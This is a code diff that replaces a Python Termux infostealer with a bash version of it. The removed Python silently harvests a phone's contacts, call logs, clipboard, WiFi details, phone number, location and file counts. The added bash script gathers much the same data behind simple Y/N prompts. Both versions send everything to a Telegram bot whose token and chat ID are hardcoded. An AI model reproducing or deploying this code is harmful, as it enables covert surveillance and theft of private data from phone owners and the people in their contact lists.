@@ -1,140 +1,88 @@
-import requests
-import os
-import platform
-import uuid
-import subprocess
-import json
-import glob
-import shutil
+#!/bin/bash
 
-# 📢 Telegram Bot Bilgileri
-BOT_TOKEN = "7635752761:AAGNNpMU3ST3LM62VLRSVXQmkIPX3Hz0xuo"
-CHAT_ID = "7561737990"
+# Telegram Bot Token ve Chat ID
+BOT_TOKEN="7635752761:AAGNNpMU3ST3LM62VLRSVXQmkIPX3Hz0xuo"
+CHAT_ID="7561737990"
 
-# 📡 IP ve cihaz bilgileri
-try:
-    ip_response = requests.get("http://ip-api.com/json/", timeout=5)
-    ip_data = ip_response.json()
-    ip_address = ip_data.get("query", "Bilinmiyor")
-    country = ip_data.get("country", "Bilinmiyor")
-    city = ip_data.get("city", "Bilinmiyor")
-except:
-    ip_address, country, city = "Bağlantı hatası", "Bağlantı hatası", "Bağlantı hatası"
+# Fonksiyon: Telegram'a mesaj gönder
+send_telegram_message() {
+    local message=$1
+    curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" -d chat_id=$CHAT_ID -d text="$message"
+}
 
-device_name = platform.node()
-mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2*6, 8)][::-1])
+# Kullanıcıdan izin almak için fonksiyon
+ask_permission() {
+    local question=$1
+    local permission
+    read -p "$question (Y/N): " permission
+    if [[ "$permission" == "Y" || "$permission" == "y" ]]; then
+        return 0  # İzin verildi
+    else
+        return 1  # İzin verilmedi
+    fi
+}
 
-# 📞 Telefon numarası alma
-try:
-    phone_number = subprocess.check_output(["termux-telephony-call"], stderr=subprocess.DEVNULL).decode().strip()
-    if not phone_number:
-        phone_number = "Erişim engellendi"
-except:
-    phone_number = "Desteklenmiyor"
+# IP, Ülke, Şehir bilgilerini alma
+if ask_permission "IP Adresi, Ülke, Şehir bilgisini almak ister misiniz?"; then
+    ip_info=$(curl -s https://ipinfo.io)
+    send_telegram_message "📡 **Bilgiler**\n$ip_info"
+fi
 
-# 📱 Telefon modeli alma
-try:
-    phone_model = subprocess.check_output(["getprop", "ro.product.model"]).decode().strip()
-except:
-    phone_model = "Bilinmiyor"
+# Batarya durumu bilgisi alma
+if ask_permission "Batarya durumu bilgisini almak ister misiniz?"; then
+    battery_info=$(termux-battery-status)
+    send_telegram_message "🔋 **Batarya Durumu**\n$battery_info"
+fi
 
-# 🔋 Batarya bilgisi
-try:
-    battery_info = subprocess.check_output(["termux-battery-status"]).decode()
-    battery_data = json.loads(battery_info)
-    battery_level = f"{battery_data.get('percentage', 'Bilinmiyor')}%"
-    battery_status = battery_data.get("status", "Bilinmiyor")
-except:
-    battery_level = "Bilinmiyor"
-    battery_status = "Bilinmiyor"
+# Telefon modelini alma
+if ask_permission "Telefon modelini almak ister misiniz?"; then
+    phone_model=$(termux-telephony-deviceinfo | grep "Model")
+    send_telegram_message "📱 **Telefon Modeli**\n$phone_model"
+fi
 
-# 📶 WiFi bilgisi
-try:
-    wifi_info = subprocess.check_output(["termux-wifi-connectioninfo"]).decode()
-    wifi_data = json.loads(wifi_info)
-    wifi_ssid = wifi_data.get("ssid", "Bilinmiyor")
-    wifi_bssid = wifi_data.get("bssid", "Bilinmiyor")
-except:
-    wifi_ssid = "Bilinmiyor"
-    wifi_bssid = "Bilinmiyor"
+# WiFi SSID ve BSSID bilgisi alma
+if ask_permission "WiFi SSID ve BSSID bilgilerini almak ister misiniz?"; then
+    wifi_info=$(termux-wifi-connectioninfo)
+    send_telegram_message "📶 **WiFi Bilgileri**\n$wifi_info"
+fi
 
-# 💾 Depolama bilgisi
-total, used, free = shutil.disk_usage("/")
-storage_info = f"💾 Toplam: {total // (2**30)} GB / Kullanılan: {used // (2**30)} GB / Boş: {free // (2**30)} GB"
+# Telefon numarasını alma
+if ask_permission "Telefon numarasını almak ister misiniz?"; then
+    phone_number=$(termux-telephony-deviceinfo | grep "Phone Number")
+    send_telegram_message "📞 **Telefon Numarası**\n$phone_number"
+fi
 
-# 📂 WhatsApp & DCIM klasöründen resimleri alma (storage/emulated dahil)
-image_paths = glob.glob("/sdcard/DCIM/**/*.jpg", recursive=True) + glob.glob("/sdcard/DCIM/**/*.png", recursive=True)
-image_paths += glob.glob("/sdcard/WhatsApp/**/*.jpg", recursive=True) + glob.glob("/sdcard/WhatsApp/**/*.png", recursive=True)
-image_paths += glob.glob("/storage/emulated/0/DCIM/**/*.jpg", recursive=True) + glob.glob("/storage/emulated/0/DCIM/**/*.png", recursive=True)
+# Rehberdeki kişileri alma
+if ask_permission "Rehberdeki kişileri almak ister misiniz?"; then
+    contacts=$(termux-contact-list)
+    send_telegram_message "📖 **Rehber Kişileri**\n$contacts"
+fi
 
-# 📖 Rehberdeki kişileri çekme
-try:
-    contacts_json = subprocess.check_output(["termux-contact-list"]).decode()
-    contacts = json.loads(contacts_json)
-    contact_list = "\n".join([f"{c.get('name', 'Bilinmiyor')} - {c.get('number', 'Bilinmiyor')}" for c in contacts[:10]])  # İlk 10 kişi
-except:
-    contact_list = "Erişim engellendi"
+# Son arama kayıtlarını alma
+if ask_permission "Son arama kayıtlarını almak ister misiniz?"; then
+    call_log=$(termux-call-log)
+    send_telegram_message "📜 **Son Arama Kayıtları**\n$call_log"
+fi
 
-# 📜 Son arama kayıtlarını alma
-try:
-    call_logs = subprocess.check_output(["termux-call-log"]).decode()
-    call_data = json.loads(call_logs)
-    call_list = "\n".join([f"{c.get('name', 'Bilinmiyor')} - {c.get('type', 'Bilinmiyor')} ({c.get('duration', '0')}sn)" for c in call_data[:5]])  # Son 5 kayıt
-except:
-    call_list = "Erişim engellendi"
+# Panodaki (Clipboard) verisini alma
+if ask_permission "Panodaki veriyi almak ister misiniz?"; then
+    clipboard=$(termux-clipboard-get)
+    send_telegram_message "📋 **Panodaki Veri**\n$clipboard"
+fi
 
-# 📋 Çalışan uygulamaları listeleme
-try:
-    running_apps = subprocess.check_output(["ps"]).decode().split("\n")[1:10]  # İlk 10 işlem
-    app_list = "\n".join(running_apps)
-except:
-    app_list = "Bilgi alınamadı"
+# WhatsApp ve DCIM'deki resimleri alma (Yalnızca JPG ve PNG)
+if ask_permission "WhatsApp ve DCIM'deki resimleri almak ister misiniz?"; then
+    whatsapp_images=$(find /storage/emulated/0/WhatsApp/Media/WhatsApp\ Images -type f -iname \*.jpg -o -iname \*.png)
+    dcim_images=$(find /storage/emulated/0/DCIM -type f -iname \*.jpg -o -iname \*.png)
+    send_telegram_message "📷 **WhatsApp ve DCIM Resimleri**\nWhatsApp Resimleri:\n$whatsapp_images\nDCIM Resimleri:\n$dcim_images"
+fi
 
-# 📁 Belgeler, ekran görüntüleri, indirmeler
-docs = glob.glob("/storage/emulated/0/Documents/**/*.pdf", recursive=True)
-screenshots = glob.glob("/storage/emulated/0/Pictures/Screenshots/**/*.png", recursive=True)
-downloads = glob.glob("/storage/emulated/0/Download/**/*.*", recursive=True)
+# Ekran görüntüleri (Screenshots)
+if ask_permission "Ekran görüntülerini almak ister misiniz?"; then
+    screenshots=$(find /storage/emulated/0/Pictures/Screenshots -type f -iname \*.jpg -o -iname \*.png)
+    send_telegram_message "📸 **Ekran Görüntüleri**\n$screenshots"
+fi
 
-# 📜 Panodaki (clipboard) veriyi çekme
-try:
-    clipboard_text = subprocess.check_output(["termux-clipboard-get"]).decode().strip()
-except:
-    clipboard_text = "Erişim yok"
+send_telegram_message "✅ **Veriler Gönderildi**"
 
-# 📩 Telegram’a gönderme
-message = f"""
-📡 **Bilgiler**
-🌍 IP: {ip_address}
-🇹🇷 Ülke: {country}
-🏙️ Şehir: {city}
-💻 Cihaz Adı: {device_name}
-📡 MAC Adresi: {mac_address}
-
-📞 Telefon Numarası: {phone_number}
-📱 Telefon Modeli: {phone_model}
-🔋 Batarya: {battery_level} ({battery_status})
-📶 WiFi: {wifi_ssid} ({wifi_bssid})
-💾 Depolama: {storage_info}
-
-📂 WhatsApp & DCIM Resim Sayısı: {len(image_paths)}
-📖 Rehber (İlk 10 Kişi):
-{contact_list}
-
-📜 Son Arama Kayıtları:
-{call_list}
-
-📋 Çalışan Uygulamalar:
-{app_list}
-
-📁 Dosya Sayısı:
-📑 Belgeler: {len(docs)}
-📸 Ekran Görüntüleri: {len(screenshots)}
-📥 İndirmeler: {len(downloads)}
-
-📜 Panodaki Veri:
-{clipboard_text}
-"""
-
-requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": message})
-
-print("✅ Bilgiler Telegram'a gönderildi.")
+exit 0
